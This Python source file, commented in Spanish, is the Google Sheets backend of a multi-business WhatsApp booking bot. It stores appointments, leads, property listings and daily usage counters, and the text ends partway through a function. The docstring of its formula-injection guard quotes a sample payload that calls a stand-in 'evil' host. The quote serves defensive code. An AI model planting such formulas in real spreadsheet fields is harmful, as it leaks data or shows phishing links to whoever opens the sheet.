import json
import logging
import os
import re
import secrets
from datetime import datetime, timezone
from urllib.parse import quote

import requests
from google.auth.transport.requests import Request as GoogleAuthRequest
from google.oauth2 import service_account

log = logging.getLogger("whatsapp-bot")

SHEETS_API = "https://sheets.googleapis.com/v4/spreadsheets"

_credentials = None
_known_tabs: set[str] = set()

# Reporte: 1 fila POR DÍA con contadores (no 1 fila por mensaje — con muchos
# negocios y mucho tráfico, una fila por evento haría la hoja inmanejable).
SUMMARY_HEADERS = [
    "Fecha", "Mensajes", "Citas solicitadas", "Citas confirmadas",
    "Citas rechazadas", "Errores", "No soportados (audio/sticker/etc)",
    "Alucinaciones bloqueadas", "Citas canceladas", "Citas modificadas",
    "Avisos de negocio actualizados", "Interesados registrados",
    # Columnas nuevas (para que la plataforma calcule el plan que le toca a cada negocio y su
    # costo real de IA — ver lib/reporte.ts y lib/costos.ts). Se agregan al FINAL a propósito:
    # así ningún índice de EVENT_COLUMN existente se mueve.
    "Conversaciones (personas distintas)", "Tokens entrada", "Tokens salida",
    "Tokens caché creado", "Tokens caché leído",
]
EVENT_COLUMN = {
    "mensaje_respondido": 1,
    "cita_solicitada": 2,
    "cita_confirmada": 3,
    "cita_rechazada": 4,
    "error_envio": 5,
    "mensaje_no_soportado": 6,
    "alucinacion_detectada": 7,
    "cita_cancelada": 8,
    "aviso_negocio_actualizado": 10,
    "cita_modificada": 9,
    "lead_registrado": 11,
}
COL_CONVERSACIONES = 12
COL_TOKENS_ENTRADA = 13
COL_TOKENS_SALIDA = 14
COL_TOKENS_CACHE_CREADO = 15
COL_TOKENS_CACHE_LEIDO = 16

CITAS_HEADERS = ["Folio", "Fecha", "customer_wa_id", "nombre", "servicio", "horario", "estado", "correo", "negocio_cliente", "Google Event ID"]
_INACTIVE_STATES = ("rechazada", "cancelada_por_cliente")

# Caracteres con los que Sheets empieza a leer una celda como fórmula en vez de texto plano.
_FORMULA_TRIGGERS = ("=", "+", "-", "@", "\t", "\r")


def _safe_cell(value) -> str:
    """Neutraliza inyección de fórmulas (CSV/Sheets injection): todo lo que se escribe con
    value_input_option="USER_ENTERED" (el modo normal de _values_append) pasa por Sheets como si
    alguien lo hubiera tecleado, así que un cliente que ponga como "nombre" u "horario" algo como
    '=IMPORTXML("https://evil","//a")' terminaría con una fórmula REAL ejecutándose en cuanto
    Daniel o el negocio abran la hoja — puede filtrar datos o mostrar un link de phishing. Anteponer
    un apóstrofo fuerza texto plano (Sheets no lo muestra, es el mismo truco que usa cualquier hoja
    de cálculo para "forzar texto")."""
    s = "" if value is None else str(value)
    return "'" + s if s.startswith(_FORMULA_TRIGGERS) else s

# Pestaña de control con un renglón por negocio dado de alta — permite que
# un mismo despliegue atienda a varios negocios a la vez, cada uno con su
# propio número de WhatsApp, sin tocar código ni variables de entorno para
# dar de alta uno nuevo.
CLIENTES_TAB = "Clientes"
CLIENTES_HEADERS = [
    "Phone Number ID", "Nombre del negocio", "Teléfono del dueño",
    "Teléfonos adicionales", "Activo", "Información del negocio",
    "Tono del bot", "Objetivo del bot", "Agenda citas", "Widget ID",
    "Telegram Chat ID", "Google Calendar ID", "Zona horaria",
    "Telegram pendiente (usuario)", "Messenger Page ID",
]


# ─── Capa de transporte: REST directo con `requests`, sin la librería ──────
# pesada google-api-python-client (que arrastra httplib2/protobuf/google-api-
# core y por sí sola inflaba la memoria del servidor hasta tumbarlo en el
# plan gratis de Render). Solo se usa google-auth, mucho más ligero, para
# firmar el token de acceso.

def _get_credentials():
    global _credentials
    if _credentials is not None:
        return _credentials
    creds_json = os.getenv("GOOGLE_SERVICE_ACCOUNT_JSON")
    if not creds_json:
        return None
    info = json.loads(creds_json)
    _credentials = service_account.Credentials.from_service_account_info(
        info, scopes=["https://www.googleapis.com/auth/spreadsheets"]
    )
    return _credentials


def _auth_headers() -> dict | None:
    creds = _get_credentials()
    if not creds:
        return None
    if not creds.valid:
        creds.refresh(GoogleAuthRequest())
    return {"Authorization": f"Bearer {creds.token}", "Content-Type": "application/json"}


def _values_get(sheet_id: str, range_str: str) -> list[list]:
    headers = _auth_headers()
    if not headers:
        return []
    url = f"{SHEETS_API}/{sheet_id}/values/{quote(range_str, safe='')}"
    resp = requests.get(url, headers=headers, timeout=15)
    resp.raise_for_status()
    return resp.json().get("values", [])


def _values_append(
    sheet_id: str, range_str: str, values: list[list],
    value_input_option: str = "USER_ENTERED", insert_data_option: str = "INSERT_ROWS",
) -> dict:
    headers = _auth_headers()
    if not headers:
        return {}
    url = f"{SHEETS_API}/{sheet_id}/values/{quote(range_str, safe='')}:append"
    params = {"valueInputOption": value_input_option, "insertDataOption": insert_data_option}
    resp = requests.post(url, headers=headers, params=params, json={"values": values}, timeout=15)
    resp.raise_for_status()
    return resp.json()


def _values_update(sheet_id: str, range_str: str, values: list[list], value_input_option: str = "RAW") -> None:
    headers = _auth_headers()
    if not headers:
        return
    url = f"{SHEETS_API}/{sheet_id}/values/{quote(range_str, safe='')}"
    params = {"valueInputOption": value_input_option}
    resp = requests.put(url, headers=headers, params=params, json={"values": values}, timeout=15)
    resp.raise_for_status()


def _batch_update(sheet_id: str, requests_body: list[dict]) -> dict:
    headers = _auth_headers()
    if not headers:
        return {}
    url = f"{SHEETS_API}/{sheet_id}:batchUpdate"
    resp = requests.post(url, headers=headers, json={"requests": requests_body}, timeout=15)
    resp.raise_for_status()
    return resp.json()


def _get_metadata(sheet_id: str) -> dict:
    headers = _auth_headers()
    if not headers:
        return {}
    resp = requests.get(f"{SHEETS_API}/{sheet_id}", headers=headers, timeout=15)
    resp.raise_for_status()
    return resp.json()


# ─── Helpers de estructura de la hoja ───────────────────────────────────────

def _format_tab(sheet_id: str, sheet_tab_id: int, num_columns: int) -> None:
    """Encabezado en negritas, fila congelada, columnas ajustadas al contenido."""
    _batch_update(sheet_id, [
        {
            "repeatCell": {
                "range": {"sheetId": sheet_tab_id, "startRowIndex": 0, "endRowIndex": 1},
                "cell": {
                    "userEnteredFormat": {
                        "textFormat": {"bold": True},
                        "backgroundColor": {"red": 0.90, "green": 0.90, "blue": 0.90},
                    }
                },
                "fields": "userEnteredFormat(textFormat,backgroundColor)",
            }
        },
        {
            "updateSheetProperties": {
                "properties": {"sheetId": sheet_tab_id, "gridProperties": {"frozenRowCount": 1}},
                "fields": "gridProperties.frozenRowCount",
            }
        },
        {
            "autoResizeDimensions": {
                "dimensions": {
                    "sheetId": sheet_tab_id, "dimension": "COLUMNS",
                    "startIndex": 0, "endIndex": num_columns,
                }
            }
        },
    ])


def _ensure_tab_exists(sheet_id: str, tab_name: str, headers: list[str]) -> None:
    if tab_name in _known_tabs:
        return

    metadata = _get_metadata(sheet_id)
    existing = {s["properties"]["title"]: s["properties"]["sheetId"] for s in metadata.get("sheets", [])}

    if tab_name not in existing:
        add_result = _batch_update(sheet_id, [{"addSheet": {"properties": {"title": tab_name}}}])
        sheet_tab_id = add_result["replies"][0]["addSheet"]["properties"]["sheetId"]
        _values_append(sheet_id, f"'{tab_name}'!A1", [headers], value_input_option="RAW")
        _format_tab(sheet_id, sheet_tab_id, len(headers))

    _known_tabs.add(tab_name)


def _citas_tab_name(business_name: str) -> str:
    return f"{business_name} - Citas"


def _row_to_appointment(row: list, row_number: int) -> dict:
    return {
        "row_number": row_number,
        "folio": row[0],
        # No se usaba en ningún lado hasta ahora (ver /api/contactos, que sí necesita mostrar
        # cuándo se pidió cada cita) — la columna siempre existió, solo faltaba leerla.
        "fecha": row[1] if len(row) > 1 else "",
        "customer_wa_id": row[2],
        "nombre": row[3],
        "servicio": row[4],
        "horario": row[5],
        "estado": row[6] if len(row) > 6 else "",
        "correo": row[7] if len(row) > 7 else "",
        "negocio_cliente": row[8] if len(row) > 8 else "",
        "google_event_id": row[9] if len(row) > 9 else "",
    }


# ─── Reporte diario ──────────────────────────────────────────────────────

def _sumar_columnas(business_name: str, valores: dict[int, int]) -> None:
    """Suma cada valor a su columna en la fila de HOY (crea la fila si es la
    primera vez hoy), en un solo viaje de lectura y uno de escritura sin
    importar cuántas columnas se toquen — importante porque esto se llama en
    medio de cada respuesta del bot, y cada llamada extra a Sheets es
    latencia real para el cliente que está esperando su mensaje. Nunca
    lanza excepciones — un fallo aquí no debe tumbar la respuesta al cliente."""
    sheet_id = os.getenv("GOOGLE_SHEET_ID")
    valores = {c: v for c, v in valores.items() if v}
    if not sheet_id or not valores:
        return

    try:
        tab = business_name
        _ensure_tab_exists(sheet_id, tab, SUMMARY_HEADERS)

        today = datetime.now(timezone.utc).strftime("%Y-%m-%d")
        ultima_col = chr(ord("A") + len(SUMMARY_HEADERS) - 1)

        rows = _values_get(sheet_id, f"'{tab}'!A2:A")
        dates = [row[0] if row else "" for row in rows]

        if today in dates:
            row_number = dates.index(today) + 2
            actual = _values_get(sheet_id, f"'{tab}'!A{row_number}:{ultima_col}{row_number}")
            fila = list(actual[0]) if actual else []
            fila += [0] * (len(SUMMARY_HEADERS) - len(fila))
            for col, valor in valores.items():
                try:
                    fila[col] = int(float(fila[col] or 0)) + valor
                except (ValueError, TypeError):
                    fila[col] = valor
            _values_update(sheet_id, f"'{tab}'!A{row_number}:{ultima_col}{row_number}", [fila])
        else:
            fila = [today] + [0] * (len(SUMMARY_HEADERS) - 1)
            for col, valor in valores.items():
                fila[col] = valor
            _values_append(sheet_id, f"'{tab}'!A1", [fila])
    except Exception:
        log.exception("No se pudo registrar en Google Sheets")


def log_event(business_name: str, evento: str) -> None:
    """Suma 1 al contador del evento en la fila del día de hoy."""
    if evento not in EVENT_COLUMN:
        return
    _sumar_columnas(business_name, {EVENT_COLUMN[evento]: 1})


def log_conversacion_nueva(business_name: str) -> None:
    """Suma 1 a "personas distintas hoy". Llamarlo solo cuando ya se
    confirmó (con memory.es_primera_vez_hoy) que ESTE cliente/visitante
    todavía no había escrito hoy — esta es la métrica real que define el
    plan de cada negocio (ver lib/planes.ts en la plataforma), a
    diferencia de "Mensajes" que cuenta cada respuesta, no cada persona."""
    _sumar_columnas(business_name, {COL_CONVERSACIONES: 1})


def log_tokens(business_name: str, entrada: int, salida: int, cache_creado: int = 0, cache_leido: int = 0) -> None:
    """Acumula el consumo real de tokens de Claude de este negocio en el día
    de hoy, para que la plataforma calcule su costo real de IA (ver
    lib/costos.ts). Se llama después de cada llamada a la API, sin importar
    si fue para contestarle a un cliente o para interpretar un aviso del
    dueño — todo ese consumo es un gasto real de este negocio."""
    _sumar_columnas(business_name, {
        COL_TOKENS_ENTRADA: entrada,
        COL_TOKENS_SALIDA: salida,
        COL_TOKENS_CACHE_CREADO: cache_creado,
        COL_TOKENS_CACHE_LEIDO: cache_leido,
    })


def negocio_existe(business_name: str) -> bool:
    """True si ese nombre está dado de alta en la pestaña 'Clientes' — se usa para validar
    cualquier endpoint que reciba un nombre de negocio desde la plataforma, así nadie puede
    usarlo para leer la pestaña de otro negocio con un nombre inventado."""
    sheet_id = os.getenv("GOOGLE_SHEET_ID")
    nombre = business_name.strip()
    if not sheet_id or not nombre:
        return False
    try:
        clientes = _values_get(sheet_id, f"'{CLIENTES_TAB}'!B2:B")
        return any(fila and fila[0].strip() == nombre for fila in clientes)
    except Exception:
        log.exception("No se pudo validar el negocio contra la pestaña Clientes")
        return False


def get_daily_report(business_name: str, month: str) -> list[dict] | None:
    """Filas del reporte diario de un negocio en un mes ('YYYY-MM'), para la
    plataforma web. None si ese nombre no está dado de alta en 'Clientes' (así
    nadie puede usar este endpoint para leer otras pestañas de la hoja), o si
    la hoja no está disponible. Lista vacía si el negocio existe pero todavía
    no registra actividad. Las fechas del reporte se guardan en UTC."""
    sheet_id = os.getenv("GOOGLE_SHEET_ID")
    nombre = business_name.strip()
    if not sheet_id or not nombre or not re.fullmatch(r"\d{4}-(0[1-9]|1[0-2])", month):
        return None
    try:
        clientes = _values_get(sheet_id, f"'{CLIENTES_TAB}'!B2:B")
        if not any(fila and fila[0].strip() == nombre for fila in clientes):
            return None
        try:
            filas = _values_get(sheet_id, "'" + nombre.replace("'", "''") + "'!A2:Q")
        except requests.HTTPError:
            return []  # todavía no se crea la pestaña del negocio: sin actividad
    except Exception:
        log.exception("No se pudo leer el reporte diario de Google Sheets")
        return None

    def num(fila: list, i: int) -> int:
        try:
            return int(float(fila[i])) if len(fila) > i and fila[i] != "" else 0
        except ValueError:
            return 0

    return [
        {
            "fecha": fila[0],
            "mensajes": num(fila, 1),
            "citas_solicitadas": num(fila, 2),
            "citas_confirmadas": num(fila, 3),
            "citas_rechazadas": num(fila, 4),
            "citas_canceladas": num(fila, 8),
            "citas_modificadas": num(fila, 9),
            "interesados": num(fila, 11),
            # Filas viejas (de antes de estas columnas) simplemente dan 0 aquí — no hay
            # forma de reconstruir ese consumo pasado, y no hace falta: solo importa de
            # aquí en adelante.
            "conversaciones": num(fila, COL_CONVERSACIONES),
            "tokens_entrada": num(fila, COL_TOKENS_ENTRADA),
            "tokens_salida": num(fila, COL_TOKENS_SALIDA),
            "tokens_cache_creado": num(fila, COL_TOKENS_CACHE_CREADO),
            "tokens_cache_leido": num(fila, COL_TOKENS_CACHE_LEIDO),
        }
        for fila in filas
        if fila and str(fila[0]).startswith(month)
    ]


# ─── Citas ───────────────────────────────────────────────────────────────

def add_pending_appointment(business_name: str, customer_wa_id: str, req: dict) -> int | None:
    """Guarda una solicitud de cita como 'pendiente' en Sheets, para que
    sobreviva aunque el servidor se reinicie antes de que el dueño conteste.
    Devuelve el folio (número de fila) para poder referenciarla después."""
    sheet_id = os.getenv("GOOGLE_SHEET_ID")
    if not sheet_id:
        log.warning("GOOGLE_SHEET_ID no configurado: la cita no queda persistida")
        return None

    try:
        tab = _citas_tab_name(business_name)
        _ensure_tab_exists(sheet_id, tab, CITAS_HEADERS)

        rows = _values_get(sheet_id, f"'{tab}'!A2:A")
        folio = len(rows) + 1

        timestamp = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
        row = [
            folio, timestamp, _safe_cell(customer_wa_id), _safe_cell(req["nombre"]),
            _safe_cell(req["servicio"]), _safe_cell(req["horario"]),
            "pendiente", _safe_cell(req.get("correo", "")), _safe_cell(req.get("negocio_cliente", "")), "",
        ]
        _values_append(sheet_id, f"'{tab}'!A1", [row])
        return folio
    except Exception:
        log.exception("No se pudo guardar la solicitud de cita en Google Sheets")
        return None


def get_pending_appointment_by_folio(business_name: str, folio: int) -> dict | None:
    """Busca una solicitud pendiente por su número de folio (para cuando el
    dueño tiene varias solicitudes a la vez y contesta una específica)."""
    sheet_id = os.getenv("GOOGLE_SHEET_ID")
    if not sheet_id:
        return None
    try:
        tab = _citas_tab_name(business_name)
        _ensure_tab_exists(sheet_id, tab, CITAS_HEADERS)
        rows = _values_get(sheet_id, f"'{tab}'!A2:J")
        for i, row in enumerate(rows, start=2):
            if len(row) >= 7 and row[6] == "pendiente" and str(row[0]) == str(folio):
                return _row_to_appointment(row, i)
        return None
    except Exception:
        log.exception("No se pudo buscar la cita por folio en Google Sheets")
        return None


def list_pending_appointments(business_name: str) -> list[dict]:
    """Devuelve TODAS las solicitudes pendientes (no solo la más antigua) —
    para mostrárselas completas al dueño cuando tiene que elegir cuál."""
    sheet_id = os.getenv("GOOGLE_SHEET_ID")
    if not sheet_id:
        return []
    try:
        tab = _citas_tab_name(business_name)
        _ensure_tab_exists(sheet_id, tab, CITAS_HEADERS)
        rows = _values_get(sheet_id, f"'{tab}'!A2:J")
        return [
            _row_to_appointment(row, i)
            for i, row in enumerate(rows, start=2)
            if len(row) >= 7 and row[6] == "pendiente"
        ]
    except Exception:
        log.exception("No se pudo listar las citas pendientes de Google Sheets")
        return []


def get_customer_active_appointments(business_name: str, wa_id: str) -> list[dict]:
    """Citas activas (ni rechazadas ni canceladas) de un cliente específico —
    para que el bot sepa qué citas ya tiene antes de crear, cancelar o
    modificar, en vez de adivinar o confundir una cita nueva con una vieja."""
    sheet_id = os.getenv("GOOGLE_SHEET_ID")
    if not sheet_id:
        return []
    try:
        tab = _citas_tab_name(business_name)
        _ensure_tab_exists(sheet_id, tab, CITAS_HEADERS)
        rows = _values_get(sheet_id, f"'{tab}'!A2:J")
        return [
            _row_to_appointment(row, i)
            for i, row in enumerate(rows, start=2)
            if len(row) >= 7 and row[2] == wa_id and row[6] not in _INACTIVE_STATES
        ]
    except Exception:
        log.exception("No se pudo leer las citas activas del cliente en Google Sheets")
        return []


def search_citas_by_query(business_name: str, query: str) -> list[dict]:
    """Busca en TODO el historial de citas de este negocio (cualquier
    estado) coincidencias de `query` contra el nombre del cliente o su
    número de WhatsApp (comparación insensible a mayúsculas, substring).

    Devuelve UN candidato por cada customer_wa_id distinto que coincida,
    usando su cita más reciente — nunca junta dos wa_id bajo un mismo
    resultado, porque dos clientes distintos pueden llamarse igual y
    confundirlos sería mostrarle al dueño la conversación de la persona
    equivocada."""
    sheet_id = os.getenv("GOOGLE_SHEET_ID")
    if not sheet_id:
        return []
    try:
        tab = _citas_tab_name(business_name)
        _ensure_tab_exists(sheet_id, tab, CITAS_HEADERS)
        rows = _values_get(sheet_id, f"'{tab}'!A2:J")
        query_norm = query.strip().lower()
        if not query_norm:
            return []
        candidatos: dict[str, dict] = {}
        for i, row in enumerate(rows, start=2):
            if len(row) < 4:
                continue
            nombre = row[3]
            wa_id = row[2] if len(row) > 2 else ""
            if query_norm not in nombre.lower() and query_norm not in wa_id.lower():
                continue
            # Se sobreescribe con cada coincidencia posterior — como las
            # filas están en orden cronológico, la última en quedar para
            # ese wa_id es su cita más reciente.
            candidatos[wa_id] = _row_to_appointment(row, i)
        return list(candidatos.values())
    except Exception:
        log.exception("No se pudo buscar citas por nombre/teléfono en Google Sheets")
        return []


def get_appointment_by_folio(business_name: str, folio: int) -> dict | None:
    """Busca una cita por folio sin importar su estado (a diferencia de
    get_pending_appointment_by_folio, que solo busca 'pendiente') — para
    validar cancelaciones/modificaciones contra el estado real."""
    sheet_id = os.getenv("GOOGLE_SHEET_ID")
    if not sheet_id:
        return None
    try:
        tab = _citas_tab_name(business_name)
        _ensure_tab_exists(sheet_id, tab, CITAS_HEADERS)
        rows = _values_get(sheet_id, f"'{tab}'!A2:J")
        for i, row in enumerate(rows, start=2):
            if len(row) >= 7 and str(row[0]) == str(folio):
                return _row_to_appointment(row, i)
        return None
    except Exception:
        log.exception("No se pudo buscar la cita por folio en Google Sheets")
        return None


def update_appointment_horario(business_name: str, row_number: int, nuevo_horario: str) -> None:
    """Actualiza solo la columna 'horario' de una fila específica."""
    sheet_id = os.getenv("GOOGLE_SHEET_ID")
    if not sheet_id:
        return
    try:
        tab = _citas_tab_name(business_name)
        # _values_update usa value_input_option="RAW" (ver más abajo): Sheets nunca interpreta
        # fórmulas en ese modo, así que aquí no hace falta _safe_cell (sí en _values_append,
        # que por default usa USER_ENTERED).
        _values_update(sheet_id, f"'{tab}'!F{row_number}", [[nuevo_horario]])
    except Exception:
        log.exception("No se pudo actualizar el horario de la cita en Google Sheets")


def update_appointment_calendar_event_id(business_name: str, row_number: int, event_id: str) -> None:
    """Guarda (o borra, si event_id es "") el ID del evento de Google
    Calendar creado para esta cita — se necesita después para poder
    actualizarlo o eliminarlo si la cita se cancela o se mueve de horario."""
    sheet_id = os.getenv("GOOGLE_SHEET_ID")
    if not sheet_id:
        return
    try:
        tab = _citas_tab_name(business_name)
        _values_update(sheet_id, f"'{tab}'!J{row_number}", [[event_id]])
    except Exception:
        log.exception("No se pudo guardar el Google Event ID de la cita en Sheets")


def mark_appointment_resolved(business_name: str, row_number: int, estado: str) -> None:
    """Actualiza la columna 'estado' de una fila específica de citas."""
    sheet_id = os.getenv("GOOGLE_SHEET_ID")
    if not sheet_id:
        return
    try:
        tab = _citas_tab_name(business_name)
        _values_update(sheet_id, f"'{tab}'!G{row_number}", [[estado]])
    except Exception:
        log.exception("No se pudo marcar la cita como resuelta en Google Sheets")


def list_all_appointments(business_name: str, limite: int = 100) -> list[dict]:
    """Todas las citas de este negocio (cualquier estado), más recientes primero — para la
    lista de contactos en la plataforma web (ver /api/contactos). Tope de `limite` para no
    mandar historiales enormes de negocios con mucho tiempo activos."""
    sheet_id = os.getenv("GOOGLE_SHEET_ID")
    if not sheet_id:
        return []
    try:
        tab = _citas_tab_name(business_name)
        _ensure_tab_exists(sheet_id, tab, CITAS_HEADERS)
        rows = _values_get(sheet_id, f"'{tab}'!A2:J")
        citas = [_row_to_appointment(row, i) for i, row in enumerate(rows, start=2) if len(row) >= 7]
        return citas[::-1][:limite]
    except Exception:
        log.exception("No se pudo listar las citas de Google Sheets")
        return []


# ─── Interesados (leads) ─────────────────────────────────────────────────
# Antes, un interesado en contratar solo generaba un aviso de Telegram al dueño — si lo pasaba
# por alto, el dato se perdía para siempre. Ahora también queda guardado aquí, con su propia
# pestaña por negocio (mismo patrón que Citas), para que aparezca en su lista de contactos.

LEADS_HEADERS = ["Folio", "Fecha", "nombre", "contacto", "negocio_cliente", "detalle", "estado"]


def _leads_tab_name(business_name: str) -> str:
    return f"{business_name} - Interesados"


def _row_to_lead(row: list, row_number: int) -> dict:
    return {
        "row_number": row_number,
        "folio": row[0],
        "fecha": row[1] if len(row) > 1 else "",
        "nombre": row[2] if len(row) > 2 else "",
        "contacto": row[3] if len(row) > 3 else "",
        "negocio_cliente": row[4] if len(row) > 4 else "",
        "detalle": row[5] if len(row) > 5 else "",
        "estado": row[6] if len(row) > 6 else "nuevo",
    }


def add_lead(business_name: str, nombre: str, contacto: str, negocio_cliente: str, detalle: str) -> int | None:
    """Guarda un interesado en contratar como 'nuevo'. Devuelve su folio."""
    sheet_id = os.getenv("GOOGLE_SHEET_ID")
    if not sheet_id:
        return None
    try:
        tab = _leads_tab_name(business_name)
        _ensure_tab_exists(sheet_id, tab, LEADS_HEADERS)
        rows = _values_get(sheet_id, f"'{tab}'!A2:A")
        folio = len(rows) + 1
        timestamp = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
        row = [folio, timestamp, _safe_cell(nombre), _safe_cell(contacto), _safe_cell(negocio_cliente), _safe_cell(detalle), "nuevo"]
        _values_append(sheet_id, f"'{tab}'!A1", [row])
        return folio
    except Exception:
        log.exception("No se pudo guardar el interesado en Google Sheets")
        return None


def list_leads(business_name: str, limite: int = 100) -> list[dict]:
    """Todos los interesados de este negocio, más recientes primero."""
    sheet_id = os.getenv("GOOGLE_SHEET_ID")
    if not sheet_id:
        return []
    try:
        tab = _leads_tab_name(business_name)
        _ensure_tab_exists(sheet_id, tab, LEADS_HEADERS)
        rows = _values_get(sheet_id, f"'{tab}'!A2:G")
        leads = [_row_to_lead(row, i) for i, row in enumerate(rows, start=2) if row]
        return leads[::-1][:limite]
    except Exception:
        log.exception("No se pudo listar los interesados de Google Sheets")
        return []


def marcar_lead_contactado(business_name: str, folio: int) -> bool:
    """Marca un interesado como 'contactado'. Devuelve False si no encontró ese folio."""
    sheet_id = os.getenv("GOOGLE_SHEET_ID")
    if not sheet_id:
        return False
    try:
        tab = _leads_tab_name(business_name)
        _ensure_tab_exists(sheet_id, tab, LEADS_HEADERS)
        rows = _values_get(sheet_id, f"'{tab}'!A2:A")
        for i, row in enumerate(rows, start=2):
            if row and str(row[0]) == str(folio):
                _values_update(sheet_id, f"'{tab}'!G{i}", [["contactado"]])
                return True
        return False
    except Exception:
        log.exception("No se pudo marcar el interesado como contactado en Google Sheets")
        return False


def eliminar_datos_finales(business_name: str) -> bool:
    """Borra las pestañas de Citas e Interesados de un negocio — datos personales de SUS
    clientes finales (nombre, teléfono, motivo), no del negocio mismo. Se llama 90 días después
    de que el negocio cancela su servicio, cumpliendo lo que promete el aviso de privacidad de la
    plataforma. NO toca la pestaña de actividad diaria (esa solo tiene contadores, no datos
    personales de nadie identificable) ni la fila del negocio en 'Clientes'.

    True si borró al menos una pestaña o si ya no había ninguna que borrar (ambos casos cuentan
    como "ya no queda nada que borrar" para quien llama). False solo si algo falló de verdad."""
    sheet_id = os.getenv("GOOGLE_SHEET_ID")
    if not sheet_id:
        return False
    try:
        metadata = _get_metadata(sheet_id)
        existentes = {s["properties"]["title"]: s["properties"]["sheetId"] for s in metadata.get("sheets", [])}
        objetivo = [_citas_tab_name(business_name), _leads_tab_name(business_name)]
        requests_body = [{"deleteSheet": {"sheetId": existentes[nombre]}} for nombre in objetivo if nombre in existentes]
        if requests_body:
            _batch_update(sheet_id, requests_body)
        for nombre in objetivo:
            _known_tabs.discard(nombre)
        return True
    except Exception:
        log.exception("No se pudieron borrar las pestañas de datos finales de Google Sheets")
        return False


# ─── Propiedades (catálogo, para negocios tipo inmobiliaria) ────────────
# Un negocio puede tener varias publicaciones activas a la vez (varias casas/terrenos) — esto le
# da al bot un catálogo real para buscar, en vez de una sola descripción genérica pegada en
# "Información del negocio". No son datos de un cliente final (no se borran a los 90 días con
# eliminar_datos_finales): son el catálogo del NEGOCIO mismo.

PROPIEDADES_HEADERS = ["Folio", "Referencia", "Tipo", "Descripcion", "Precio", "Ubicacion", "Instrucciones especiales", "Activa"]


def _propiedades_tab_name(business_name: str) -> str:
    return f"{business_name} - Propiedades"


def _row_to_propiedad(row: list, row_number: int) -> dict:
    return {
        "row_number": row_number,
        "folio": row[0] if len(row) > 0 else "",
        "referencia": row[1].strip() if len(row) > 1 else "",
        "tipo": row[2].strip() if len(row) > 2 else "",
        "descripcion": row[3].strip() if len(row) > 3 else "",
        "precio": row[4].strip() if len(row) > 4 else "",
        "ubicacion": row[5].strip() if len(row) > 5 else "",
        "instrucciones": row[6].strip() if len(row) > 6 else "",
        "activa": (row[7].strip().upper() if len(row) > 7 else "SI") not in ("NO", "FALSE", "0"),
    }


def add_propiedad(business_name: str, referencia: str, tipo: str, descripcion: str, precio: str, ubicacion: str, instrucciones: str = "") -> int | None:
    """Agrega una propiedad al catálogo del negocio. `referencia` es el identificador corto que
    se usa en los anuncios de "Clic para enviar mensaje" (ref=...) para que el bot la reconozca
    de inmediato sin tener que adivinar. Devuelve el folio."""
    sheet_id = os.getenv("GOOGLE_SHEET_ID")
    if not sheet_id:
        return None
    try:
        tab = _propiedades_tab_name(business_name)
        _ensure_tab_exists(sheet_id, tab, PROPIEDADES_HEADERS)
        rows = _values_get(sheet_id, f"'{tab}'!A2:A")
        folio = len(rows) + 1
        row = [
            folio, _safe_cell(referencia), _safe_cell(tipo), _safe_cell(descripcion),
            _safe_cell(precio), _safe_cell(ubicacion), _safe_cell(instrucciones), "SI",
        ]
        _values_append(sheet_id, f"'{tab}'!A1", [row])
        return folio
    except Exception:
        log.exception("No se pudo agregar la propiedad en Google Sheets")
        return None


def list_propiedades(business_name: str, solo_activas: bool = True) -> list[dict]:
    """Catálogo completo de propiedades de este negocio, para que el bot busque ahí."""
    sheet_id = os.getenv("GOOGLE_SHEET_ID")
    if not sheet_id:
        return []
    try:
        tab = _propiedades_tab_name(business_name)
        _ensure_tab_exists(sheet_id, tab, PROPIEDADES_HEADERS)
        rows = _values_get(sheet_id, f"'{tab}'!A2:H")
        propiedades = [_row_to_propiedad(row, i) for i, row in enumerate(rows, start=2) if row]
        return [p for p in propiedades if p["activa"]] if solo_activas else propiedades
    except Exception:
        log.exception("No se pudo listar el catálogo de propiedades de Google Sheets")
        return []


def get_propiedad_por_referencia(business_name: str, referencia: str) -> dict | None:
    """Busca una propiedad por su código de referencia (el mismo que se usa en el `ref` de un
    anuncio de 'Clic para enviar mensaje') — para saber de cuál propiedad viene el cliente sin
    tener que adivinar por conversación."""
    ref = (referencia or "").strip()
    if not ref:
        return None
    return next((p for p in list_propiedades(business_name, solo_activas=False) if p["referencia"] == ref), None)


_COL_PROPIEDAD = {"referencia": "B", "tipo": "C", "descripcion": "D", "precio": "E", "ubicacion": "F", "instrucciones": "G", "activa": "H"}


def editar_propiedad(business_name: str, folio: int, campos: dict) -> bool:
    """Actualiza uno o varios campos de una propiedad existente (por su folio), desde el panel
    de la plataforma. `campos` es un dict con cualquier combinación de las llaves de
    _COL_PROPIEDAD. 'activa' se manda como bool (se convierte a 'SI'/'NO'). Devuelve False si no
    encontró ese folio."""
    sheet_id = os.getenv("GOOGLE_SHEET_ID")
    if not sheet_id:
        return False
    try:
        tab = _propiedades_tab_name(business_name)
        _ensure_tab_exists(sheet_id, tab, PROPIEDADES_HEADERS)
        rows = _values_get(sheet_id, f"'{tab}'!A2:A")
        idx = next((i for i, r in enumerate(rows) if r and str(r[0]) == str(folio)), None)
        if idx is None:
            return False
        fila_real = idx + 2
        for campo, valor in campos.items():
            col = _COL_PROPIEDAD.get(campo)
            if not col:
                continue
            valor_final = ("SI" if valor else "NO") if campo == "activa" else _safe_cell(str(valor))
            _values_update(sheet_id, f"'{tab}'!{col}{fila_real}", [[valor_final]], value_input_option="USER_ENTERED")
        return True
    except Exception:
        log.exception("No se pudo editar la propiedad en Google Sheets")
        return False


def eliminar_propiedad(business_name: str, folio: int) -> bool:
    """Borrado suave: marca la propiedad como inactiva en vez de borrar la fila, para no perder
    el historial. El bot ya no la muestra ni la usa (list_propiedades solo trae activas)."""
    return editar_propiedad(business_name, folio, {"activa": False})


# ─── Config de negocios (multi-tenant) ──────────────────────────────────

def _row_to_business_config(row: list) -> dict | None:
    """Arma el dict de configuración de un negocio a partir de su fila en
    'Clientes', sin importar qué columna se usó para encontrarla (Phone
    Number ID, Widget ID, o Telegram Chat ID) — así el "business_id"
    universal (usado como llave de memoria/avisos/cache) siempre sale
    igual para la misma fila, sin importar el canal por el que llegó el
    mensaje que la buscó. Devuelve None si el negocio está inactivo."""
    activo = row[4].strip().upper() if len(row) > 4 else "SI"
    if activo not in ("SI", "SÍ", "YES", "TRUE", "1"):
        return None

    phone_number_id = row[0].strip() if len(row) > 0 else ""
    widget_id = row[9].strip() if len(row) > 9 else ""
    telegram_chat_id = row[10].strip() if len(row) > 10 else ""
